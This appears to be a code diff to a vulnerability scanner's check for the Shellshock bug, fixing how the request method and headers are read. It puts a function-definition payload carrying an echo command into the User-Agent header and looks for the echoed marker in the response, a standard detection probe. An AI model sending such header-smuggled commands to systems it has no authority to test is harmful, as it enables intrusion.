@@ -17,11 +17,11 @@ def verify(task):
     }
 
     url = task['url']
-    method = task['request_header']
+    headers = task['request_header']
+    method = task['method']
     data = task['request_content'] if method == 'POST' else None
     # url =  'http://%s:%s/' % (ip, port)
     payload = '''() { :;}; echo 1a8b8e54b53f63a4efae84e064373f12:'''
-    headers = task['headers']
     headers['User-Agent'] = payload
 
     hj = THTTPJOB(url, method=method, headers=headers, data=data)
@@ -32,7 +32,7 @@ def verify(task):
         message['param'] = payload
         save_to_databases(message)
         return True, message
-    
+
     return (False, {})
     # code, head, res, errcode, _ = curl.curl('-A "%s" %s' % (payload, url))
     # if '1a8b8e54b53f63a4efae84e064373f12' in head:
